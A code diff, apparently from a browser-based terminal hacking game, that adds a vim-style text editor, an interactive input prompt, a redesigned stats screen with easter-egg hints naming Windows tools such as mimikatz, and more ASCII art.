+  textarea.value = lines.join('\n');
+  updateEditorLineNumbers();
+  setEditorCursorPos(Math.min(pos.line, lines.length), 1);
+}
+
+function vimDeleteChar() {
+  saveUndoState();
+  const textarea = document.getElementById('code-editor-content');
+  const pos = textarea.selectionStart;
+  const content = textarea.value;
+
+  if (pos < content.length) {
+    codeEditor.yankBuffer = content[pos];
+    textarea.value = content.slice(0, pos) + content.slice(pos + 1);
+    textarea.selectionStart = textarea.selectionEnd = pos;
+    updateEditorLineNumbers();
+    updateEditorStatus();
+  }
+}
+
+function vimYankLine(count = 1) {
+  const textarea = document.getElementById('code-editor-content');
+  const pos = getEditorCursorPos();
+  const lines = textarea.value.split('\n');
+
+  const yanked = lines.slice(pos.line - 1, pos.line - 1 + count);
+  codeEditor.yankBuffer = yanked.join('\n');
+
+  print(`${count} line(s) yanked`, 'info');
+}
+
+function vimPaste(before = false) {
+  if (!codeEditor.yankBuffer) return;
+
+  saveUndoState();
+  const textarea = document.getElementById('code-editor-content');
+  const pos = getEditorCursorPos();
+  const lines = textarea.value.split('\n');
+
+  // Check if yanked content is lines (has newlines or ends with newline behavior)
+  const isLinePaste = codeEditor.yankBuffer.includes('\n') || codeEditor.lastCommand.includes('d') || codeEditor.lastCommand.includes('y');
+
+  if (isLinePaste) {
+    const insertLine = before ? pos.line - 1 : pos.line;
+    lines.splice(insertLine, 0, codeEditor.yankBuffer);
+    textarea.value = lines.join('\n');
+    setEditorCursorPos(insertLine + 1, 1);
+  } else {
+    const insertPos = before ? textarea.selectionStart : textarea.selectionStart + 1;
+    textarea.value = textarea.value.slice(0, insertPos) + codeEditor.yankBuffer + textarea.value.slice(insertPos);
+    textarea.selectionStart = textarea.selectionEnd = insertPos + codeEditor.yankBuffer.length;
+    updateEditorStatus();
+  }
+
+  updateEditorLineNumbers();
+}
+
+function vimJoinLines() {
+  saveUndoState();
+  const textarea = document.getElementById('code-editor-content');
+  const pos = getEditorCursorPos();
+  const lines = textarea.value.split('\n');
+
+  if (pos.line < lines.length) {
+    const currentLine = lines[pos.line - 1];
+    const nextLine = lines[pos.line].trimStart();
+    lines[pos.line - 1] = currentLine + ' ' + nextLine;
+    lines.splice(pos.line, 1);
+    textarea.value = lines.join('\n');
+    setEditorCursorPos(pos.line, currentLine.length + 1);
+    updateEditorLineNumbers();
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════
+// VIM EDITOR - Search
+// ═══════════════════════════════════════════════════════════════
+function vimSearch(query, forward = true) {
+  const textarea = document.getElementById('code-editor-content');
+  const content = textarea.value;
+  codeEditor.searchQuery = query;
+  codeEditor.searchResults = [];
+
+  if (!query) return;
+
+  let match;
+  const regex = new RegExp(query.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'gi');
+  while ((match = regex.exec(content)) !== null) {
+    codeEditor.searchResults.push(match.index);
+  }
+
+  if (codeEditor.searchResults.length === 0) {
+    print(`Pattern not found: ${query}`, 'error');
+    return;
+  }
+
+  // Find next match from cursor
+  const cursorPos = textarea.selectionStart;
+  let targetIndex = forward
+    ? codeEditor.searchResults.find(pos => pos > cursorPos)
+    : [...codeEditor.searchResults].reverse().find(pos => pos < cursorPos);
+
+  if (targetIndex === undefined) {
+    targetIndex = forward ? codeEditor.searchResults[0] : codeEditor.searchResults[codeEditor.searchResults.length - 1];
+    print(`Search wrapped`, 'info');
+  }
+
+  textarea.selectionStart = textarea.selectionEnd = targetIndex;
+  textarea.focus();
+  updateEditorStatus();
+}
+
+function vimSearchNext(forward = true) {
+  if (!codeEditor.searchQuery) return;
+  vimSearch(codeEditor.searchQuery, forward);
+}
+
+// ═══════════════════════════════════════════════════════════════
+// VIM EDITOR - Additional motions (f, t, c, text objects)
+// ═══════════════════════════════════════════════════════════════
+function vimFindChar(char, forward = true, tillChar = false) {
+  const textarea = document.getElementById('code-editor-content');
+  const pos = getEditorCursorPos();
+  const lines = textarea.value.split('\n');
+  const line = lines[pos.line - 1];
+
+  if (forward) {
+    const searchStart = pos.col;
+    const index = line.indexOf(char, searchStart);
+    if (index !== -1) {
+      const newCol = tillChar ? index : index + 1;
+      setEditorCursorPos(pos.line, newCol);
+      codeEditor.lastFindChar = { char, forward, tillChar };
+    }
+  } else {
+    const searchEnd = pos.col - 2;
+    const index = line.lastIndexOf(char, searchEnd);
+    if (index !== -1) {
+      const newCol = tillChar ? index + 2 : index + 1;
+      setEditorCursorPos(pos.line, newCol);
+      codeEditor.lastFindChar = { char, forward, tillChar };
+    }
+  }
+}
+
+function vimRepeatFindChar(reverse = false) {
+  if (!codeEditor.lastFindChar) return;
+  const { char, forward, tillChar } = codeEditor.lastFindChar;
+  vimFindChar(char, reverse ? !forward : forward, tillChar);
+}
+
+function vimChange(motion, count) {
+  switch (motion) {
+    case 'w':
+      // Change word
+      saveUndoState();
+      const taCW = document.getElementById('code-editor-content');
+      const startCW = taCW.selectionStart;
+      const contentCW = taCW.value;
+      const afterCW = contentCW.slice(startCW);
+      const wordMatchCW = afterCW.match(/^\w+/);
+      if (wordMatchCW) {
+        codeEditor.yankBuffer = wordMatchCW[0];
+        taCW.value = contentCW.slice(0, startCW) + contentCW.slice(startCW + wordMatchCW[0].length);
+        taCW.selectionStart = taCW.selectionEnd = startCW;
+        setEditorMode('insert');
+        updateEditorLineNumbers();
+      }
+      break;
+    case 'c':
+      // Change line (cc)
+      saveUndoState();
+      const taCC = document.getElementById('code-editor-content');
+      const posCC = getEditorCursorPos();
+      const linesCC = taCC.value.split('\n');
+      codeEditor.yankBuffer = linesCC[posCC.line - 1];
+      linesCC[posCC.line - 1] = '';
+      taCC.value = linesCC.join('\n');
+      setEditorCursorPos(posCC.line, 1);
+      setEditorMode('insert');
+      updateEditorLineNumbers();
+      break;
+    case '$':
+      // Change to end of line
+      saveUndoState();
+      const taC$ = document.getElementById('code-editor-content');
+      const posC$ = getEditorCursorPos();
+      const linesC$ = taC$.value.split('\n');
+      const lineC$ = linesC$[posC$.line - 1];
+      codeEditor.yankBuffer = lineC$.slice(posC$.col - 1);
+      linesC$[posC$.line - 1] = lineC$.slice(0, posC$.col - 1);
+      taC$.value = linesC$.join('\n');
+      setEditorMode('insert');
+      updateEditorLineNumbers();
+      break;
+    case 'i':
+    case 'a':
+      // ci/ca - need another char for text object
+      codeEditor.pendingKey = 'c' + motion;
+      break;
+    default:
+      break;
+  }
+}
+
+function vimTextObject(operation, modifier, object) {
+  // operation: 'd' (delete), 'c' (change), 'y' (yank)
+  // modifier: 'i' (inner), 'a' (around)
+  // object: 'w' (word), '"', "'", '(', ')', '{', '}', '[', ']', '<', '>', 'b' (block), 'B' (Block)
+
+  const textarea = document.getElementById('code-editor-content');
+  const pos = textarea.selectionStart;
+  const content = textarea.value;
+  let start, end;
+
+  switch (object) {
+    case 'w': // word
+      // Find word boundaries
+      let wordStart = pos;
+      let wordEnd = pos;
+      while (wordStart > 0 && /\w/.test(content[wordStart - 1])) wordStart--;
+      while (wordEnd < content.length && /\w/.test(content[wordEnd])) wordEnd++;
+      if (modifier === 'a') {
+        // Include trailing whitespace
+        while (wordEnd < content.length && /\s/.test(content[wordEnd])) wordEnd++;
+      }
+      start = wordStart;
+      end = wordEnd;
+      break;
+
+    case '"':
+    case "'":
+    case '`':
+      // String text object
+      const lineStart = content.lastIndexOf('\n', pos - 1) + 1;
+      const lineEnd = content.indexOf('\n', pos);
+      const line = content.slice(lineStart, lineEnd === -1 ? undefined : lineEnd);
+      const relPos = pos - lineStart;
+
+      // Find matching quotes
+      let quoteStart = line.lastIndexOf(object, relPos);
+      let quoteEnd = line.indexOf(object, relPos);
+
+      if (quoteStart === -1 || quoteEnd === -1 || quoteStart >= quoteEnd) {
+        // Try to find quote pair differently
+        quoteStart = line.indexOf(object);
+        quoteEnd = line.indexOf(object, quoteStart + 1);
+      }
+
+      if (quoteStart !== -1 && quoteEnd !== -1 && quoteStart < quoteEnd) {
+        start = lineStart + quoteStart + (modifier === 'i' ? 1 : 0);
+        end = lineStart + quoteEnd + (modifier === 'a' ? 1 : 0);
+      } else {
+        return; // No matching quotes found
+      }
+      break;
+
+    case '(':
+    case ')':
+    case 'b': // block
+      findMatchingPair('(', ')');
+      break;
+
+    case '{':
+    case '}':
+    case 'B': // Block
+      findMatchingPair('{', '}');
+      break;
+
+    case '[':
+    case ']':
+      findMatchingPair('[', ']');
+      break;
+
+    case '<':
+    case '>':
+      findMatchingPair('<', '>');
+      break;
+
+    default:
+      return;
+  }
+
+  function findMatchingPair(openChar, closeChar) {
+    let depth = 0;
+    let pairStart = -1;
+    let pairEnd = -1;
+
+    // Find opening bracket
+    for (let i = pos; i >= 0; i--) {
+      if (content[i] === closeChar) depth++;
+      if (content[i] === openChar) {
+        if (depth === 0) {
+          pairStart = i;
+          break;
+        }
+        depth--;
+      }
+    }
+
+    // Find closing bracket
+    depth = 0;
+    for (let i = pos; i < content.length; i++) {
+      if (content[i] === openChar) depth++;
+      if (content[i] === closeChar) {
+        if (depth === 0) {
+          pairEnd = i;
+          break;
+        }
+        depth--;
+      }
+    }
+
+    if (pairStart !== -1 && pairEnd !== -1) {
+      start = pairStart + (modifier === 'i' ? 1 : 0);
+      end = pairEnd + (modifier === 'a' ? 1 : 0);
+    }
+  }
+
+  if (start === undefined || end === undefined) return;
+
+  const selectedText = content.slice(start, end);
+
+  switch (operation) {
+    case 'd':
+      saveUndoState();
+      codeEditor.yankBuffer = selectedText;
+      textarea.value = content.slice(0, start) + content.slice(end);
+      textarea.selectionStart = textarea.selectionEnd = start;
+      updateEditorLineNumbers();
+      updateEditorStatus();
+      break;
+    case 'c':
+      saveUndoState();
+      codeEditor.yankBuffer = selectedText;
+      textarea.value = content.slice(0, start) + content.slice(end);
+      textarea.selectionStart = textarea.selectionEnd = start;
+      setEditorMode('insert');
+      updateEditorLineNumbers();
+      break;
+    case 'y':
+      codeEditor.yankBuffer = selectedText;
+      print(`Yanked: ${selectedText.length} characters`, 'info');
+      break;
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════
+// VIM EDITOR - Main keyboard handler
+// ═══════════════════════════════════════════════════════════════
+document.addEventListener('keydown', (e) => {
+  if (!codeEditor.isOpen) return;
+
+  // ─── NORMAL MODE ───────────────────────────────────────────
+  if (codeEditor.mode === 'normal') {
+    const key = e.key;
+
+    // Check for number prefix (repeat count)
+    if (/^[1-9]$/.test(key) && !codeEditor.pendingKey) {
+      codeEditor.repeatCount = codeEditor.repeatCount * 10 + parseInt(key);
+      e.preventDefault();
+      return;
+    }
+    if (key === '0' && codeEditor.repeatCount > 0) {
+      codeEditor.repeatCount = codeEditor.repeatCount * 10;
+      e.preventDefault();
+      return;
+    }
+
+    const count = codeEditor.repeatCount || 1;
+
+    // Handle multi-key commands
+    if (codeEditor.pendingKey) {
+      const pending = codeEditor.pendingKey;
+      const combo = pending + key;
+      e.preventDefault();
+
+      // Handle f/F/t/T + character
+      if (pending === 'f' || pending === 'F' || pending === 't' || pending === 'T') {
+        codeEditor.pendingKey = '';
+        codeEditor.repeatCount = 0;
+        vimFindChar(key, pending === 'f' || pending === 't', pending === 't' || pending === 'T');
+        return;
+      }
+
+      // Handle c + motion (change)
+      if (pending === 'c') {
+        codeEditor.pendingKey = '';
+        codeEditor.repeatCount = 0;
+        vimChange(key, count);
+        return;
+      }
+
+      // Handle ci/di/yi + text object
+      if (pending === 'ci' || pending === 'di' || pending === 'yi') {
+        codeEditor.pendingKey = '';
+        codeEditor.repeatCount = 0;
+        vimTextObject(pending[0], 'i', key);
+        return;
+      }
+
+      // Handle ca/da/ya + text object
+      if (pending === 'ca' || pending === 'da' || pending === 'ya') {
+        codeEditor.pendingKey = '';
+        codeEditor.repeatCount = 0;
+        vimTextObject(pending[0], 'a', key);
+        return;
+      }
+
+      // Two-char combos that need a third char
+      if (combo === 'ci' || combo === 'di' || combo === 'yi' ||
+          combo === 'ca' || combo === 'da' || combo === 'ya') {
+        codeEditor.pendingKey = combo;
+        return;
+      }
+
+      codeEditor.pendingKey = '';
+      codeEditor.repeatCount = 0;
+
+      switch (combo) {
+        case 'gg':
+          vimMove('gg');
+          break;
+        case 'dd':
+          vimDeleteLine(count);
+          codeEditor.lastCommand = 'dd';
+          break;
+        case 'yy':
+          vimYankLine(count);
+          codeEditor.lastCommand = 'yy';
+          break;
+        case 'cc':
+          // Change entire line
+          saveUndoState();
+          const taCC = document.getElementById('code-editor-content');
+          const posCC = getEditorCursorPos();
+          const linesCC = taCC.value.split('\n');
+          codeEditor.yankBuffer = linesCC[posCC.line - 1];
+          linesCC[posCC.line - 1] = '';
+          taCC.value = linesCC.join('\n');
+          setEditorCursorPos(posCC.line, 1);
+          setEditorMode('insert');
+          updateEditorLineNumbers();
+          break;
+        case 'dw':
+          // Delete word
+          saveUndoState();
+          const ta = document.getElementById('code-editor-content');
+          const start = ta.selectionStart;
+          const content = ta.value;
+          const afterCursor = content.slice(start);
+          const wordMatch = afterCursor.match(/^\w+\s*|\W+/);
+          if (wordMatch) {
+            codeEditor.yankBuffer = wordMatch[0];
+            ta.value = content.slice(0, start) + content.slice(start + wordMatch[0].length);
+            ta.selectionStart = ta.selectionEnd = start;
+            updateEditorLineNumbers();
+          }
+          break;
+        case 'd$':
+        case 'D':
+          // Delete to end of line
+          saveUndoState();
+          const taD = document.getElementById('code-editor-content');
+          const posD = getEditorCursorPos();
+          const linesD = taD.value.split('\n');
+          const lineD = linesD[posD.line - 1];
+          codeEditor.yankBuffer = lineD.slice(posD.col - 1);
+          linesD[posD.line - 1] = lineD.slice(0, posD.col - 1);
+          taD.value = linesD.join('\n');
+          updateEditorLineNumbers();
+          updateEditorStatus();
+          break;
+        case 'd0':
+          // Delete to start of line
+          saveUndoState();
+          const taD0 = document.getElementById('code-editor-content');
+          const posD0 = getEditorCursorPos();
+          const linesD0 = taD0.value.split('\n');
+          const lineD0 = linesD0[posD0.line - 1];
+          codeEditor.yankBuffer = lineD0.slice(0, posD0.col - 1);
+          linesD0[posD0.line - 1] = lineD0.slice(posD0.col - 1);
+          taD0.value = linesD0.join('\n');
+          setEditorCursorPos(posD0.line, 1);
+          updateEditorLineNumbers();
+          break;
+        case 'cw':
+          // Change word
+          saveUndoState();
+          const taCW = document.getElementById('code-editor-content');
+          const startCW = taCW.selectionStart;
+          const contentCW = taCW.value;
+          const afterCW = contentCW.slice(startCW);
+          const wordMatchCW = afterCW.match(/^\w+/);
+          if (wordMatchCW) {
+            codeEditor.yankBuffer = wordMatchCW[0];
+            taCW.value = contentCW.slice(0, startCW) + contentCW.slice(startCW + wordMatchCW[0].length);
+            taCW.selectionStart = taCW.selectionEnd = startCW;
+            setEditorMode('insert');
+            updateEditorLineNumbers();
+          }
+          break;
+        case 'yw':
+          // Yank word
+          const taYW = document.getElementById('code-editor-content');
+          const startYW = taYW.selectionStart;
+          const afterYW = taYW.value.slice(startYW);
+          const wordMatchYW = afterYW.match(/^\w+\s*/);
+          if (wordMatchYW) {
+            codeEditor.yankBuffer = wordMatchYW[0];
+            print('Word yanked', 'info');
+          }
+          break;
+        case 'y$':
+          // Yank to end of line
+          const taY$ = document.getElementById('code-editor-content');
+          const posY$ = getEditorCursorPos();
+          const linesY$ = taY$.value.split('\n');
+          codeEditor.yankBuffer = linesY$[posY$.line - 1].slice(posY$.col - 1);
+          print('Yanked to end of line', 'info');
+          break;
+        case 'gd':
+          // Go to definition (simulated - search for function/variable definition)
+          const taGD = document.getElementById('code-editor-content');
+          const posGD = getEditorCursorPos();
+          const linesGD = taGD.value.split('\n');
+          const lineGD = linesGD[posGD.line - 1];
+          const wordAtCursor = lineGD.slice(posGD.col - 1).match(/^\w+/);
+          if (wordAtCursor) {
+            vimSearch(`(function|def|int|void|char|struct)\\s+${wordAtCursor[0]}`, true);
+          }
+          break;
+        default:
+          // Unknown combo
+          break;
+      }
+      return;
+    }
+
+    // Single key commands
+    switch (key) {
+      // Movement
+      case 'h':
+      case 'ArrowLeft':
+        e.preventDefault();
+        vimMove('h', count);
+        break;
+      case 'j':
+      case 'ArrowDown':
+        e.preventDefault();
+        vimMove('j', count);
+        break;
+      case 'k':
+      case 'ArrowUp':
+        e.preventDefault();
+        vimMove('k', count);
+        break;
+      case 'l':
+      case 'ArrowRight':
+        e.preventDefault();
+        vimMove('l', count);
+        break;
+      case 'w':
+        e.preventDefault();
+        vimMove('w', count);
+        break;
+      case 'b':
+        e.preventDefault();
+        vimMove('b', count);
+        break;
+      case '0':
+        e.preventDefault();
+        vimMove('0');
+        break;
+      case '$':
+        e.preventDefault();
+        vimMove('$');
+        break;
+      case '^':
+        e.preventDefault();
+        vimMove('^');
+        break;
+      case 'G':
+        e.preventDefault();
+        if (count > 1) {
+          setEditorCursorPos(count, 1);
+        } else {
+          vimMove('G');
+        }
+        break;
+      case 'g':
+        codeEditor.pendingKey = 'g';
+        e.preventDefault();
+        break;
+
+      // Find character motions
+      case 'f':
+        codeEditor.pendingKey = 'f';
+        e.preventDefault();
+        break;
+      case 'F':
+        codeEditor.pendingKey = 'F';
+        e.preventDefault();
+        break;
+      case 't':
+        codeEditor.pendingKey = 't';
+        e.preventDefault();
+        break;
+      case 'T':
+        codeEditor.pendingKey = 'T';
+        e.preventDefault();
+        break;
+      case ';':
+        // Repeat last find
+        e.preventDefault();
+        vimRepeatFindChar(false);
+        break;
+      case ',':
+        // Repeat last find in reverse
+        e.preventDefault();
+        vimRepeatFindChar(true);
+        break;
+
+      // Mode switching
+      case 'i':
+        e.preventDefault();
+        setEditorMode('insert');
+        break;
+      case 'I':
+        e.preventDefault();
+        vimMove('^');
+        setEditorMode('insert');
+        break;
+      case 'a':
+        e.preventDefault();
+        vimMove('l');
+        setEditorMode('insert');
+        break;
+      case 'A':
+        e.preventDefault();
+        vimMove('$');
+        setEditorMode('insert');
+        break;
+      case 'o':
+        e.preventDefault();
+        saveUndoState();
+        const taO = document.getElementById('code-editor-content');
+        const posO = getEditorCursorPos();
+        const linesO = taO.value.split('\n');
+        linesO.splice(posO.line, 0, '');
+        taO.value = linesO.join('\n');
+        setEditorCursorPos(posO.line + 1, 1);
+        setEditorMode('insert');
+        updateEditorLineNumbers();
+        break;
+      case 'O':
+        e.preventDefault();
+        saveUndoState();
+        const taOO = document.getElementById('code-editor-content');
+        const posOO = getEditorCursorPos();
+        const linesOO = taOO.value.split('\n');
+        linesOO.splice(posOO.line - 1, 0, '');
+        taOO.value = linesOO.join('\n');
+        setEditorCursorPos(posOO.line, 1);
+        setEditorMode('insert');
+        updateEditorLineNumbers();
+        break;
+
+      // Visual mode
+      case 'v':
+        e.preventDefault();
+        setEditorMode('visual');
+        break;
+      case 'V':
+        e.preventDefault();
+        setEditorMode('visualLine');
+        break;
+
+      // Editing
+      case 'c':
+        codeEditor.pendingKey = 'c';
+        e.preventDefault();
+        break;
+      case 'C':
+        // Change to end of line
+        e.preventDefault();
+        vimChange('$', count);
+        break;
+      case 'd':
+        codeEditor.pendingKey = 'd';
+        e.preventDefault();
+        break;
+      case 'D':
+        // Delete to end of line
+        e.preventDefault();
+        saveUndoState();
+        const taD = document.getElementById('code-editor-content');
+        const posD = getEditorCursorPos();
+        const linesD = taD.value.split('\n');
+        const lineD = linesD[posD.line - 1];
+        codeEditor.yankBuffer = lineD.slice(posD.col - 1);
+        linesD[posD.line - 1] = lineD.slice(0, posD.col - 1);
+        taD.value = linesD.join('\n');
+        updateEditorLineNumbers();
+        updateEditorStatus();
+        break;
+      case 'y':
+        codeEditor.pendingKey = 'y';
+        e.preventDefault();
+        break;
+      case 'Y':
+        // Yank entire line
+        e.preventDefault();
+        vimYankLine(count);
+        break;
+      case 's':
+        // Substitute char (delete and enter insert mode)
+        e.preventDefault();
+        saveUndoState();
+        vimDeleteChar();
+        setEditorMode('insert');
+        break;
+      case 'S':
+        // Substitute line
+        e.preventDefault();
+        saveUndoState();
+        const taS = document.getElementById('code-editor-content');
+        const posS = getEditorCursorPos();
+        const linesS = taS.value.split('\n');
+        codeEditor.yankBuffer = linesS[posS.line - 1];
+        linesS[posS.line - 1] = '';
+        taS.value = linesS.join('\n');
+        setEditorCursorPos(posS.line, 1);
+        setEditorMode('insert');
+        updateEditorLineNumbers();
+        break;
+      case 'r':
+        if (!e.ctrlKey) {
+          // Replace char (wait for next char)
+          codeEditor.pendingKey = 'r';
+          e.preventDefault();
+        }
+        break;
+      case 'R':
+        // Replace mode
+        e.preventDefault();
+        setEditorMode('replace');
+        break;
+      case 'x':
+        e.preventDefault();
+        vimDeleteChar();
+        break;
+      case 'p':
+        e.preventDefault();
+        vimPaste(false);
+        break;
+      case 'P':
+        e.preventDefault();
+        vimPaste(true);
+        break;
+      case 'u':
+        e.preventDefault();
+        editorUndo();
+        break;
+      case 'r':
+        if (e.ctrlKey) {
+          e.preventDefault();
+          editorRedo();
+        }
+        break;
+      case 'J':
+        e.preventDefault();
+        vimJoinLines();
+        break;
+
+      // Search
+      case '/':
+        e.preventDefault();
+        setEditorMode('search');
+        break;
+      case 'n':
+        e.preventDefault();
+        vimSearchNext(true);
+        break;
+      case 'N':
+        e.preventDefault();
+        vimSearchNext(false);
+        break;
+
+      // Command mode
+      case ':':
+        e.preventDefault();
+        setEditorMode('command');
+        break;
+
+      case 'Escape':
+        codeEditor.pendingKey = '';
+        codeEditor.repeatCount = 0;
+        break;
+    }
+
+    codeEditor.repeatCount = 0;
+
+  // ─── INSERT MODE ───────────────────────────────────────────
+  } else if (codeEditor.mode === 'insert') {
+    if (e.key === 'Escape') {
+      e.preventDefault();
+      setEditorMode('normal');
+      // Move cursor back one position like vim
+      const ta = document.getElementById('code-editor-content');
+      if (ta.selectionStart > 0) {
+        ta.selectionStart = ta.selectionEnd = ta.selectionStart - 1;
+      }
+      updateEditorStatus();
+    }
+    // Save undo state on significant changes
+    if (e.key === 'Enter' || e.key === ' ' || e.key === 'Backspace') {
+      saveUndoState();
+    }
+    // Update line numbers on input
+    setTimeout(updateEditorLineNumbers, 0);
+    setTimeout(updateEditorStatus, 0);
+
+  // ─── COMMAND MODE ───────────────────────────────────────────
+  } else if (codeEditor.mode === 'command') {
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      handleEditorCommand(document.getElementById('code-editor-cmd-input').value);
+    } else if (e.key === 'Escape') {
+      e.preventDefault();
+      setEditorMode('normal');
+    }
+
+  // ─── SEARCH MODE ───────────────────────────────────────────
+  } else if (codeEditor.mode === 'search') {
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      const query = document.getElementById('code-editor-cmd-input').value.slice(1); // Remove /
+      vimSearch(query, true);
+      setEditorMode('normal');
+    } else if (e.key === 'Escape') {
+      e.preventDefault();
+      setEditorMode('normal');
+    }
+  }
+});
+
+// Update editor status on cursor move
+document.getElementById('code-editor-content')?.addEventListener('click', function() {
+  updateEditorStatus();
+});
+
+// Also track input changes for line numbers
+document.getElementById('code-editor-content')?.addEventListener('input', function() {
+  updateEditorLineNumbers();
+  updateEditorStatus();
+});
+
+// ============================================
+// STDIN INPUT SYSTEM (for interactive commands)
+// ============================================
+const stdinState = {
+  active: false,
+  prompt: '',
+  callback: null,
+  isPassword: false
+};
+
+function requestStdin(prompt, callback, isPassword = false) {
+  stdinState.active = true;
+  stdinState.prompt = prompt;
+  stdinState.callback = callback;
+  stdinState.isPassword = isPassword;
+
+  document.getElementById('prompt').textContent = prompt;
+  const input = document.getElementById('terminal-input');
+  input.type = isPassword ? 'password' : 'text';
+  input.value = '';
+  input.focus();
+}
+
+function handleStdinInput(value) {
+  const callback = stdinState.callback;
+  stdinState.active = false;
+  stdinState.callback = null;
+
+  document.getElementById('terminal-input').type = 'text';
+
+  if (callback) {
+    callback(value);
+  }
+}
+
+// ============================================
 // GAME STATE
 // ============================================
 const gameState = {
@@ -422,7 +2261,7 @@ function saveGame() {
 // Autosave on state change - call this after important progress
 function autosave() {
   saveGame();
-  print('[autosaved]', 'system');
+  // Silent autosave - don't spam the terminal
 }
 
 // ============================================
@@ -477,33 +2316,68 @@ function addEasterEgg(eggId, message) {
 // ============================================
 // STATS DISPLAY
 // ============================================
+const EASTER_EGG_NAMES = {
+  'lvl1_whoami': { level: 1, hint: 'Who are you?' },
+  'lvl2_mimikatz': { level: 2, hint: 'The cat that steals passwords...' },
+  'lvl3_netuser': { level: 3, hint: 'Old school Windows enumeration' },
+  'lvl4_tasklist': { level: 4, hint: 'Know your enemy processes' },
+  'lvl5_windbg': { level: 5, hint: 'Kernel debugging commands' },
+  'lvl6_godsays': { level: 6, hint: 'Ask the oracle...' },
+  'secret_matrix': { level: 0, hint: 'Follow the white rabbit...' }
+};
+
 function showStats() {
   calculateScore();
 
   print('');
-  print('╔═══════════════════════════════════════════╗', 'info');
-  print('║           YOUR HACKER STATS               ║', 'info');
-  print('╠═══════════════════════════════════════════╣', 'info');
-  print(`║  Hacker: ${gameState.hackerName.padEnd(30)} ║`, 'success');
-  print('╠═══════════════════════════════════════════╣', 'info');
-  print(`║  Score: ${String(gameState.score).padStart(6)}                          ║`, 'highlight');
-  print(`║  Levels Completed: ${gameState.levelsCompleted.length}/6                    ║`, 'system');
-  print(`║  Progress: ${Math.round((gameState.levelsCompleted.length / 6) * 100)}%                            ║`, 'system');
-  print(`║  Easter Eggs Found: ${gameState.easterEggsFound.length}/6                   ║`, gameState.easterEggsFound.length > 0 ? 'success' : 'system');
-  print(`║  Total Attempts: ${String(gameState.attempts).padStart(4)}                    ║`, 'system');
-  print('╠═══════════════════════════════════════════╣', 'info');
+  print('╔═══════════════════════════════════════════════════════════╗', 'info');
+  print('║                    YOUR HACKER STATS                      ║', 'info');
+  print('╠═══════════════════════════════════════════════════════════╣', 'info');
+  print(`║  Hacker: ${gameState.hackerName.padEnd(44)} ║`, 'success');
+  print('╠═══════════════════════════════════════════════════════════╣', 'info');
+  print(`║  Score: ${String(gameState.score).padStart(6)}                                          ║`, 'highlight');
+  print(`║  Levels Completed: ${gameState.levelsCompleted.length}/6                                  ║`, 'system');
+
+  // Progress bar
+  const progress = Math.round((gameState.levelsCompleted.length / 6) * 100);
+  const barFill = Math.floor(progress / 5);
+  const progressBar = '█'.repeat(barFill) + '░'.repeat(20 - barFill);
+  print(`║  Progress: [${progressBar}] ${String(progress).padStart(3)}%     ║`, progress === 100 ? 'success' : 'system');
+
+  print(`║  Easter Eggs Found: ${gameState.easterEggsFound.length}/7                                 ║`, gameState.easterEggsFound.length > 0 ? 'success' : 'system');
+  print(`║  Total Attempts: ${String(gameState.attempts).padStart(4)}                                ║`, 'system');
+  print('╠═══════════════════════════════════════════════════════════╣', 'info');
 
   // Show level progress
-  print('║  Level Progress:                          ║', 'info');
+  print('║  LEVEL PROGRESS:                                          ║', 'info');
   LEVELS.forEach(level => {
     const completed = gameState.levelsCompleted.includes(level.id);
-    const status = completed ? '[DONE]' : (gameState.currentLevel === level.id ? '[>>  ]' : '[    ]');
+    const status = completed ? '[✓]' : (gameState.currentLevel === level.id ? '[>]' : '[ ]');
     const color = completed ? 'success' : (gameState.currentLevel === level.id ? 'warning' : 'system');
-    print(`║    ${status} ${level.id}. ${level.name.padEnd(28)} ║`, color);
+    print(`║    ${status} Level ${level.id}: ${level.name.padEnd(38)} ║`, color);
   });
 
-  print('╚═══════════════════════════════════════════╝', 'info');
+  print('╠═══════════════════════════════════════════════════════════╣', 'info');
+
+  // Show easter egg hints
+  print('║  EASTER EGGS:                                             ║', 'info');
+  Object.entries(EASTER_EGG_NAMES).forEach(([eggId, egg]) => {
+    const found = gameState.easterEggsFound.includes(eggId);
+    const levelStr = egg.level === 0 ? 'Secret' : `Lvl ${egg.level}`;
+    const hint = found ? '✓ FOUND!' : egg.hint;
+    print(`║    [${levelStr.padEnd(6)}] ${hint.padEnd(42)} ║`, found ? 'success' : 'system');
+  });
+
+  print('╚═══════════════════════════════════════════════════════════╝', 'info');
   print('');
+
+  // Special message for completing everything
+  if (gameState.levelsCompleted.length === 6 && gameState.easterEggsFound.length >= 6) {
+    print(ASCII.pwned, 'ascii');
+    print('🎉 CONGRATULATIONS! You are a TRUE HACKER! 🎉', 'highlight');
+    print('You have completed all levels and found all easter eggs!', 'success');
+    print('');
+  }
 }
 
 // ============================================
@@ -734,8 +2608,130 @@ const ASCII = {
     ┃                    ┃
     ┃   so close...      ┃
     ╰━━━━━━━━━━━━━━━━━━━━━╯
+`,
+  hacker2: `
+   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+   █ ▄▄▄▄▄ █▄ ▄▄▄█▀ ▀███▀▄▀█ ▄▄▄▄▄ █
+   █ █   █ █▀▄███▀▀▄█ ▀█▀▄██ █   █ █
+   █ █▄▄▄█ █▄▀▀█▄▄█ █▄█ ███ █▄▄▄█ █
+   █▄▄▄▄▄▄▄█▄▀▄█▄█ ▀▄▀▄█ █▄▄▄▄▄▄▄█
+   █▄ ▀▀ █▄▄▀▄▄▀▄▄▀ █▀▀▀█▀▀█▀▄▀ ▄█
+    [ACCESS GRANTED]
+`,
+  access: `
+    ╔═══════════════════════════════════════╗
+    ║     █████╗  ██████╗ ██████╗███████╗   ║
+    ║    ██╔══██╗██╔════╝██╔════╝██╔════╝   ║
+    ║    ███████║██║     ██║     █████╗     ║
+    ║    ██╔══██║██║     ██║     ██╔══╝     ║
+    ║    ██║  ██║╚██████╗╚██████╗███████╗   ║
+    ║    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝   ║
+    ║          G R A N T E D                ║
+    ╚═══════════════════════════════════════╝
+`,
+  locked: `
+    ╔═════════════════════════════╗
+    ║         .-"""-.            ║
+    ║        /        \\          ║
+    ║       |  O    O  |          ║
+    ║       |    __    |          ║
+    ║        \\  \\__/  /          ║
+    ║         '------'            ║
+    ║      ┌──────────┐          ║
